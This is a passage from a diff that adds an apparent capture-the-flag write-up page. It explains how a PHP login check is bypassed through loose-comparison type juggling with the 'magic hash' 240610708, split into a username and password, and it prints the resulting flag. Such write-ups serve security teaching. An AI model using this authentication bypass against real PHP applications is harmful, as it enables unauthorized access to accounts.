+</span><span>      </span><span style="color:#b48ead;">return  </span><span>$</span><span style="color:#bf616a;">success</span><span>;
+</span><span>      [...]
+</span><span style="color:#ab7967;">?&gt;
+</span></code></pre>
+<p>So we need to have an MD5 hash equal to 0e413229387827631581229643338212. This is a basic type juggling in PHP, because 0e0123.. is a float representation in PHP we can do the following:</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>0e123 == 0e456
+</span><span>True
+</span></code></pre>
+<p>We want a magic hashed in PHP, it's an hash where the content is only made of integers. WhiteHatSec already done the research for us : https://www.whitehatsec.com/blog/magic-hashes/</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span style="color:#ab7967;">&lt;?php
+</span><span style="color:#b48ead;">if </span><span>(</span><span style="color:#96b5b4;">hash</span><span>(&#39;</span><span style="color:#a3be8c;">md5</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">240610708</span><span>&#39;,</span><span style="color:#d08770;">false</span><span>) == &#39;</span><span style="color:#a3be8c;">0</span><span>&#39;) {
+</span><span>  </span><span style="color:#96b5b4;">print </span><span>&quot;</span><span style="color:#a3be8c;">Matched.n</span><span>&quot;;
+</span><span>}
+</span></code></pre>
+<p>We can split the string "240610708" to create a valid authentification.</p>
+<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>user:10708    
+</span><span>pass:2406
+</span></code></pre>
+<p>Then we get the flag ECW{846badef298374cc62934fdfdeee2341}</p>
+<p>This challenge reminded me of one I created for the ESE 2016, check out the write-up ! ;)</p>
+<ul>
+<li><a href="https://github.com/swisskyrepo/ESIEA_SECURE_EDITION_2016/tree/master/crypto_250_-_magic_crypto_language">ESE 2016 - Magic Crypto Language</a></li>
+</ul>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/frenchcroissant/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>French Croissant - or why you need to lock your computer</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
